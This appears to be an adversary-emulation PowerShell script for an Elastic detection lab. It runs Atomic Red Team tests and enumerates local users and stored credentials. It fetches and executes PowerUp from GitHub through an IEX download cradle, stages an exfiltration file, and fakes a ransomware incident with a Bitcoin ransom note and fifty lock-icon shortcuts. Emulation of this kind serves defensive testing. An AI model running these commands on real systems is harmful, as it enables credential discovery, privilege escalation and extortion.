Write-Host "[+] Set up"
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
Start-Sleep -S 15

Write-Host "[+] T1091"
Invoke-AtomicTest T1091
Start-Sleep -S 15

Write-Host "[+] Windows Enumeration"
net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localuser | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup "Users" | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\temp\Powerup.txt"
Start-Sleep -S 15

Write-Host "[+] Exfil"
Invoke-AtomicTest T1020
Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\T1020_exfilFile.txt

Start-Sleep -S 15

Write-Host "[+] Ransomware"

Echo "Ooops, your files have been encrypted! 

What Happened to My Computer? 
Your important files are encrypted. 
Many of your documents, photos, videos, databases and other files are no longer 
accessible because they have been encrypted. Maybe you are busy looking for a way to 
recover your files, but do not waste your time. Nobody can recover your files without 
our decryption service. 

Can I Recover My Files?
Sure. We guarantee that you can recover all your files safely and easily. But you have
not so enough time.
You can decrypt some of your files for free. Try now by clicking <Decrypt>.
But if you want to decrypt all your files, you need to pay.

You only have 3 days to submit the payment. After that the price will be doubled.
Also, if you don't pay in 7 days, you won't be able to recover your files forever.
We will have free events for users who are so poor that they couldn't pay in 6 months.

How Do I Pay?
Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.
Please check the current price of Bitcoin and buy some bitcoins. For more information,
click <How to buy bitcoins>.And send the correct amount to the address specified in this window.
After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am

OUTEM Polda
B bitcoin
ACCEPTED HERE
Send $300 worth of bitcoin to this address:
12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\Elastic\Desktop\YOUR_FILES.txt

# Creation of locked files 
$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom1.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom2.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom3.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom4.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom5.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom6.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom7.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom8.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom9.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom10.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()


$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom11.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom12.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom13.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom14.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom15.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom16.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom17.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom18.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom19.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom20.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom21.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom22.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom23.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom24.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom25.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom26.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom27.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom28.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom29.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom30.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom31.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom32.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom33.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom34.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom35.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom36.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom37.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom38.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom39.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom40.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom41.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom42.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom43.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom44.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom45.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom46.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom47.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom48.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom49.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom50.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()
